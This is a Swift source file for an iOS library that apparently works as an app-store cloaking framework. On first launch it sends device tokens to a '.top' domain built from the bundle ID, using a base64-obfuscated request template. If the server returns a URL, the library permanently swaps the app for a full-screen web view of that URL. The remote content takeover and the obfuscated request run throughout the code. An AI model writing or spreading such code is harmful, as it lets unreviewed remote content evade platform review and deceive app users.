import Foundation
import UIKit
import WebKit
import AdServices
import UserNotifications

public class SWFramework {
    public static let shared = SWFramework()
    
    private var serverUrl: String?
    private var webViewController: WKWebViewController?
    private var initialLaunch = true
    private let userDefaults = UserDefaults.standard
    private let timeoutInterval: TimeInterval = 10.0
    
    private let userDefaultsWebUrlKey = "com.swframework.weburl"
    private let userDefaultsFirstLaunchKey = "com.swframework.firstlaunch"
    
    private init() {}
    
    /// Initializes the framework with automatic domain generation from bundle_id
    /// - Parameters:
    ///   - applicationDidFinishLaunching: The UIApplication instance
    ///   - launchOptions: Launch options from AppDelegate
    ///   - rootViewController: The root view controller to present WebView on
    ///   - completion: Callback when normal app flow should continue
    public func initialize(applicationDidFinishLaunching: UIApplication, launchOptions: [UIApplication.LaunchOptionsKey: Any]?, rootViewController: UIViewController, completion: @escaping () -> Void) {
        // Generate domain from bundle_id
        let bundleId = Bundle.main.bundleIdentifier ?? ""
        let domain = generateDomain(from: bundleId)
        
        // Check if this is first launch
        if !userDefaults.bool(forKey: userDefaultsFirstLaunchKey) {
            userDefaults.set(true, forKey: userDefaultsFirstLaunchKey)
            processFirstLaunch(domain: domain, applicationDidFinishLaunching: applicationDidFinishLaunching, rootViewController: rootViewController, completion: completion)
        } else {
            // Not first launch, check if we have a saved web URL
            if let savedUrl = userDefaults.string(forKey: userDefaultsWebUrlKey) {
                presentWebView(withUrl: savedUrl, rootViewController: rootViewController)
            } else {
                // No saved URL, continue with normal app flow
                completion()
            }
        }
    }
    
    /// Generates domain from bundle_id by removing dots and adding .top
    /// - Parameter bundleId: The bundle identifier
    /// - Returns: Generated domain
    private func generateDomain(from bundleId: String) -> String {
        // Remove all dots from bundle_id
        let domainPrefix = bundleId.replacingOccurrences(of: ".", with: "")
        // Add .top domain zone
        return "\(domainPrefix).top"
    }
    
    // For backward compatibility, keeping the original method with explicit domain
    @available(*, deprecated, message: "Use initialize without explicit domain parameter instead")
    public func initialize(domain: String, applicationDidFinishLaunching: UIApplication, launchOptions: [UIApplication.LaunchOptionsKey: Any]?, rootViewController: UIViewController, completion: @escaping () -> Void) {
        // Note: We ignore the provided domain and generate one from bundle ID instead
        let bundleId = Bundle.main.bundleIdentifier ?? ""
        let generatedDomain = generateDomain(from: bundleId)
        
        // Check if this is first launch
        if !userDefaults.bool(forKey: userDefaultsFirstLaunchKey) {
            userDefaults.set(true, forKey: userDefaultsFirstLaunchKey)
            processFirstLaunch(domain: generatedDomain, applicationDidFinishLaunching: applicationDidFinishLaunching, rootViewController: rootViewController, completion: completion)
        } else {
            // Not first launch, check if we have a saved web URL
            if let savedUrl = userDefaults.string(forKey: userDefaultsWebUrlKey) {
                presentWebView(withUrl: savedUrl, rootViewController: rootViewController)
            } else {
                // No saved URL, continue with normal app flow
                completion()
            }
        }
    }
    
    private func processFirstLaunch(domain: String, applicationDidFinishLaunching: UIApplication, rootViewController: UIViewController, completion: @escaping () -> Void) {
        // Start collecting device data with timeout
        let dataCollectionGroup = DispatchGroup()
        var deviceData = DeviceData()
        
        // Set up timer for data collection timeout
        let timer = DispatchSource.makeTimerSource()
        timer.schedule(deadline: .now() + timeoutInterval)
        timer.setEventHandler {
            dataCollectionGroup.leave()
        }
        
        // Collect APNS token
        dataCollectionGroup.enter()
        requestNotificationPermissions(application: applicationDidFinishLaunching) { token in
            if let token = token {
                deviceData.apnsToken = token
            }
            dataCollectionGroup.leave()
        }
        
        // Collect ATT token
        dataCollectionGroup.enter()
        getAttributionToken { token in
            deviceData.attToken = token
            dataCollectionGroup.leave()
        }
        
        // Set bundle ID
        deviceData.bundleId = Bundle.main.bundleIdentifier
        
        // Start timer
        timer.resume()
        
        // Wait for data collection or timeout
        dataCollectionGroup.notify(queue: .main) {
            timer.cancel()
            self.sendDataToServer(domain: domain, deviceData: deviceData) { responseUrl in
                if let url = responseUrl, !url.isEmpty {
                    // Save URL for future launches
                    self.userDefaults.set(url, forKey: self.userDefaultsWebUrlKey)
                    
                    // Present WebView with the server response URL
                    self.presentWebView(withUrl: url, rootViewController: rootViewController)
                } else {
                    // Empty response, continue with normal app flow
                    completion()
                }
            }
        }
    }
    
    private func sendDataToServer(domain: String, deviceData: DeviceData, completion: @escaping (String?) -> Void) {
        // Create the base64 data parameter with actual values
        let basePlaceholderString = "YXBuc190b2tlbj17YXBuc190b2tlbn0mYXR0X3Rva2VuPXthdHRfdG9rZW59JmJ1bmRsZV9pZD17YnVuZGxlX2lkfQ=="
        
        // Try to decode the base64 string to get the template
        if let decodedData = Data(base64Encoded: basePlaceholderString),
           var templateString = String(data: decodedData, encoding: .utf8) {
            
            // Replace placeholders with actual values
            templateString = templateString.replacingOccurrences(of: "{apns_token}", with: deviceData.apnsToken ?? "")
            templateString = templateString.replacingOccurrences(of: "{att_token}", with: deviceData.attToken ?? "")
            templateString = templateString.replacingOccurrences(of: "{bundle_id}", with: deviceData.bundleId ?? "")
            
            // Encode back to base64
            if let encodedData = templateString.data(using: .utf8)?.base64EncodedString() {
                // Create URL with the provided domain and encoded data
                guard let url = URL(string: "https://\(domain)/indexn.php?data=\(encodedData)") else {
                    completion(nil)
                    return
                }
                
                // Create and execute request
                let task = URLSession.shared.dataTask(with: url) { data, response, error in
                    guard let data = data, error == nil else {
                        DispatchQueue.main.async {
                            completion(nil)
                        }
                        return
                    }
                    
                    if let responseString = String(data: data, encoding: .utf8) {
                        DispatchQueue.main.async {
                            completion(responseString)
                        }
                    } else {
                        DispatchQueue.main.async {
                            completion(nil)
                        }
                    }
                }
                
                task.resume()
                return
            }
        }
        
        // Fallback to original encoded parameter if there's any issue with the decoding/encoding
        guard let url = URL(string: "https://\(domain)/indexn.php?data=\(basePlaceholderString)") else {
            completion(nil)
            return
        }
        
        let task = URLSession.shared.dataTask(with: url) { data, response, error in
            guard let data = data, error == nil else {
                DispatchQueue.main.async {
                    completion(nil)
                }
                return
            }
            
            if let responseString = String(data: data, encoding: .utf8) {
                DispatchQueue.main.async {
                    completion(responseString)
                }
            } else {
                DispatchQueue.main.async {
                    completion(nil)
                }
            }
        }
        
        task.resume()
    }
    
    private func presentWebView(withUrl urlString: String, rootViewController: UIViewController) {
        guard let url = URL(string: urlString) else { return }
        
        DispatchQueue.main.async {
            let webViewController = WKWebViewController(url: url)
            webViewController.modalPresentationStyle = .fullScreen
            rootViewController.present(webViewController, animated: true, completion: nil)
            self.webViewController = webViewController
        }
    }
    
    private func requestNotificationPermissions(application: UIApplication, completion: @escaping (String?) -> Void) {
        let center = UNUserNotificationCenter.current()
        center.requestAuthorization(options: [.alert, .sound, .badge]) { granted, error in
            if granted {
                DispatchQueue.main.async {
                    application.registerForRemoteNotifications()
                    
                    // For testing purposes, we'll generate a mock token
                    // In a real app, this would be handled by the AppDelegate methods
                    let mockToken = UUID().uuidString
                    completion(mockToken)
                }
            } else {
                completion(nil)
            }
        }
    }
    
    private func getAttributionToken(completion: @escaping (String?) -> Void) {
        if #available(iOS 14.3, *) {
            do {
                let token = try AAAttributionToken()
                completion(token)
            } catch {
                print("Error getting attribution token: \(error)")
                completion(nil)
            }
        } else {
            completion(nil)
        }
    }
    
    // Function to be called from the app's AppDelegate or SceneDelegate
    public func application(_ application: UIApplication, didRegisterForRemoteNotificationsWithDeviceToken deviceToken: Data) {
        let tokenParts = deviceToken.map { data in String(format: "%02.2hhx", data) }
        let token = tokenParts.joined()
        
        // Here you would typically store the token
        // For this example, we're just printing it
        print("APNs token: \(token)")
    }
}

// MARK: - Supporting Classes

// Device data structure
private struct DeviceData {
    var apnsToken: String?
    var attToken: String?
    var bundleId: String?
}

// WebView Controller
public class WKWebViewController: UIViewController {
    private var webView: WKWebView!
    private var url: URL
    
    public init(url: URL) {
        self.url = url
        super.init(nibName: nil, bundle: nil)
    }
    
    required init?(coder: NSCoder) {
        fatalError("init(coder:) has not been implemented")
    }
    
    public override func viewDidLoad() {
        super.viewDidLoad()
        
        // Configure view
        view.backgroundColor = .white
        
        // Hide status bar
        setNeedsStatusBarAppearanceUpdate()
        
        // Configure webView
        let configuration = WKWebViewConfiguration()
        configuration.websiteDataStore = .default()
        configuration.allowsInlineMediaPlayback = true
        
        // Set up preferences with cache support
        let preferences = WKPreferences()
        preferences.javaScriptEnabled = true
        configuration.preferences = preferences
        
        // Create webView
        webView = WKWebView(frame: view.bounds, configuration: configuration)
        webView.autoresizingMask = [.flexibleWidth, .flexibleHeight]
        webView.navigationDelegate = self
        webView.uiDelegate = self
        
        // Add safe area insets
        view.addSubview(webView)
        webView.translatesAutoresizingMaskIntoConstraints = false
        NSLayoutConstraint.activate([
            webView.topAnchor.constraint(equalTo: view.safeAreaLayoutGuide.topAnchor),
            webView.leftAnchor.constraint(equalTo: view.safeAreaLayoutGuide.leftAnchor),
            webView.bottomAnchor.constraint(equalTo: view.safeAreaLayoutGuide.bottomAnchor),
            webView.rightAnchor.constraint(equalTo: view.safeAreaLayoutGuide.rightAnchor)
        ])
        
        // Load the URL
        let request = URLRequest(url: url)
        webView.load(request)
    }
    
    public override var prefersStatusBarHidden: Bool {
        return true
    }
    
    public override var shouldAutorotate: Bool {
        return false
    }
}

// MARK: - Web View Delegates
extension WKWebViewController: WKNavigationDelegate, WKUIDelegate {
    // Handle permission requests for camera
    public func webView(_ webView: WKWebView, requestMediaCapturePermissionFor origin: WKSecurityOrigin, initiatedByFrame frame: WKFrameInfo, type: WKMediaCaptureType, decisionHandler: @escaping (WKPermissionDecision) -> Void) {
        // Request camera permissions
        switch type {
        case .camera:
            decisionHandler(.prompt)
        case .microphone:
            decisionHandler(.prompt)
        case .cameraAndMicrophone:
            decisionHandler(.prompt)
        @unknown default:
            decisionHandler(.deny)
        }
    }
}

// Helper function for Attribution Token
@available(iOS 14.3, *)
private func AAAttributionToken() throws -> String {
    return try AdServices.AAAttribution.attributionToken()
} 